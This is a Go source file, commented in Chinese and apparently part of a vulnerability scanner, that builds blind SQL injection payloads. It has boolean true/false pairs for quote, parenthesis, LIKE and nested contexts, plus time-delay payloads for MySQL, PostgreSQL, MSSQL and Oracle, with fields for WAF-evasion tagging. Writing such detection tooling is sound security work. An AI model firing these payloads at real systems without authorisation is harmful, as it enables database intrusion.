package sqli

import "fmt"

// 本文件负责「验证广度」中的数据库方言维度。
//
// 盲注 payload 的方言差异集中在三处：语句终止注释、延时函数、逻辑运算符别名。
// 布尔条件本身（1=1 / 1=2）各家通用，因此布尔差分靠「闭合上下文」展开，
// 时间盲注才需要按方言逐一套用延时函数。
//
// 扩大尝试范围不会降低准确率：每一条候选都必须通过同一套差分门控，
// 加候选只是增加「证明漏洞存在」的机会，而不是放宽结论门槛。

// commentTail 是各主流数据库都兼容的行内注释。
// MySQL 要求 "--" 后必须跟空白字符，因此写成 "-- -"。
const commentTail = "-- -"

// boolPair 是一组布尔差分候选。
//
// trueValue 应让查询保持原有结果集，falseValue 应让结果集为空。两者只差一个
// 恒真/恒假条件，这是布尔差分判定的基础。
type boolPair struct {
	// label 说明闭合上下文与构造方式（时间盲注即「方言/延时函数」）。
	label string
	// dialect 标明该候选面向的数据库方言；布尔条件通用，该字段主要用于结果
	// 归类，以及让「逻辑运算符替换」这类方言相关的绕过决定是否生效。
	dialect string
	// evasion 记录施加的绕过风格，空串表示未绕过。命中后必须能说清是哪一步
	// 绕过了 WAF，否则证据链失去可复核性。
	evasion string
	// trueValue 是恒真 payload，falseValue 是恒假（对照组）payload。
	trueValue  string
	falseValue string
	// timeTrueTmpl 仅时间盲注候选使用：保留带 %s/%d 的原始模板，便于按不同秒数档位
	// 重新生成触发 payload（成比例验证要用到加档）。空串表示不是时间盲注候选。
	timeTrueTmpl string
	// seconds 是该时间盲注候选触发时使用的秒数。
	seconds int
}

// sqlContext 是一种闭合上下文：把原始参数值闭合成一个可注入表达式。
type sqlContext struct {
	name string
	// trueTmpl / falseTmpl 中的 %s 为原始参数值。
	trueTmpl  string
	falseTmpl string
	// noComment 为 true 表示该上下文不加注释终止，直接依赖原语句末尾的引号收尾。
	//
	// 注释终止虽然通用，却会把参数之后的 SQL（如 "AND released = 1"）一并注释掉，
	// 使恒真响应的结果集偏离基线而漏报；靠语句末尾引号收尾则完整保留原查询语义，
	// 恒真响应与基线一致。两者互补：注释型先试，收尾型紧随其后。
	noComment bool
}

// contexts 覆盖最常见的注入上下文，按命中概率从高到低排列。
//
// 顺序即成本：一旦某条候选确认命中就停止，绝大多数站点在前两条就能得出结论，
// 后面的上下文只在前面的都排除后才付出流量。因此新增的边界往末尾排；只有与既有
// 上下文「互补」的收尾方式（注释型失败时才会用到）紧挨着它排，避免在最常见的
// 参数后面还有其它条件的站点上白跑一整套上下文。
var contexts = []sqlContext{
	{name: "numeric", trueTmpl: "%s AND 1=1", falseTmpl: "%s AND 1=2"},
	{name: "single-quote", trueTmpl: "%s' AND '1'='1'", falseTmpl: "%s' AND '1'='2'"},
	// 与上一条互补的收尾方式：不加注释，靠原语句末尾的引号闭合。参数后面还挂着
	// 其它条件（如 "AND released = 1"）时，注释型会把它们一并注释掉，恒真响应的
	// 结果集随之偏离基线而被判不成立；这一条完整保留原查询语义，恒真响应与基线一致。
	{name: "single-quote", trueTmpl: "%s' AND '1'='1", falseTmpl: "%s' AND '1'='2", noComment: true},
	{name: "double-quote", trueTmpl: `%s" AND "1"="1"`, falseTmpl: `%s" AND "1"="2"`},
	{name: "paren-numeric", trueTmpl: "%s) AND 1=1", falseTmpl: "%s) AND 1=2"},
	{name: "paren-single", trueTmpl: "%s') AND '1'='1'", falseTmpl: "%s') AND '1'='2'"},
	// LIKE 上下文：参数落在 '%...%' 里，闭合时要先补上被截断的 %。
	{name: "like-single", trueTmpl: "%s%%' AND '1'='1'", falseTmpl: "%s%%' AND '1'='2'"},
	{name: "paren-double", trueTmpl: `%s") AND "1"="1"`, falseTmpl: `%s") AND "1"="2"`},
	// 双层闭合：参数在函数参数或 IN (...) 的最内层，需要连补两个括号。
	{name: "paren-nested-single", trueTmpl: "%s')) AND ('1'='1'", falseTmpl: "%s')) AND ('1'='2'"},
}

// timePayload 描述一种数据库方言的时间盲注构造方式。
type timePayload struct {
	dialect string
	name    string
	// trueTmpl 中的 %s 为原始值、%d 为秒数；falseTmpl 只含 %s。
	trueTmpl  string
	falseTmpl string
}

// timePayloads 覆盖主流数据库的延时手段，按实际遇到频率排序。
//
// 非目标方言上发送这些 payload 只会得到语法错误、快速返回，成本是一次请求，
// 因此「都试一遍」在流量上是可接受的。
var timePayloads = []timePayload{
	{dialect: "mysql", name: "SLEEP", trueTmpl: "%s' AND SLEEP(%d)", falseTmpl: "%s' AND SLEEP(0)"},
	{dialect: "mysql", name: "SLEEP-numeric", trueTmpl: "%s AND SLEEP(%d)", falseTmpl: "%s AND SLEEP(0)"},
	{
		dialect:   "postgresql",
		name:      "pg_sleep",
		trueTmpl:  "%s' AND 1=(SELECT 1 FROM pg_sleep(%d))",
		falseTmpl: "%s' AND 1=(SELECT 1 FROM pg_sleep(0))",
	},
	{
		dialect:   "mssql",
		name:      "WAITFOR",
		trueTmpl:  "%s'; WAITFOR DELAY '0:0:%d'",
		falseTmpl: "%s'; WAITFOR DELAY '0:0:0'",
	},
	{
		dialect:   "oracle",
		name:      "dbms_pipe",
		trueTmpl:  "%s' AND dbms_pipe.receive_message(('a'),%d)=0",
		falseTmpl: "%s' AND dbms_pipe.receive_message(('a'),0)=0",
	},
}

// boolPairsFor 按给定上下文生成布尔差分候选。
func boolPairsFor(ctxs []sqlContext, orig string) []boolPair {
	out := make([]boolPair, 0, len(ctxs))
	for _, c := range ctxs {
		// 收尾型不加注释终止（tail 为空），标签也与注释型区分开，便于复核者看清
		// 这次命中是靠注释还是靠语句末尾引号收的尾。
		tail, tag := commentTail, commentTail
		if c.noComment {
			tail, tag = "", "closed"
		}
		out = append(out, boolPair{
			label:      c.name + "/" + tag,
			dialect:    "generic",
			trueValue:  fmt.Sprintf(c.trueTmpl, orig) + tail,
			falseValue: fmt.Sprintf(c.falseTmpl, orig) + tail,
		})
	}
	return out
}

// boolPairs 生成全部闭合上下文的布尔差分候选。
func boolPairs(orig string) []boolPair { return boolPairsFor(contexts, orig) }

// timePairsFor 按给定方言生成时间盲注候选。
func timePairsFor(payloads []timePayload, orig string, seconds int) []boolPair {
	out := make([]boolPair, 0, len(payloads))
	for _, tp := range payloads {
		out = append(out, boolPair{
			label:      tp.dialect + "/" + tp.name,
			dialect:    tp.dialect,
			trueValue:  fmt.Sprintf(tp.trueTmpl, orig, seconds) + commentTail,
			falseValue: fmt.Sprintf(tp.falseTmpl, orig) + commentTail,
			// 留下带 %d 的模板，成比例验证要按加档秒数重新生成触发 payload。
			timeTrueTmpl: tp.trueTmpl + commentTail,
			seconds:      seconds,
		})
	}
	return out
}

// timePairs 生成全部数据库方言的时间盲注候选。
//
// 对照组是时间盲注不可或缺的一环：没有它就无法区分「注入生效」与「目标本来就慢」。
func timePairs(orig string, seconds int) []boolPair {
	return timePairsFor(timePayloads, orig, seconds)
}
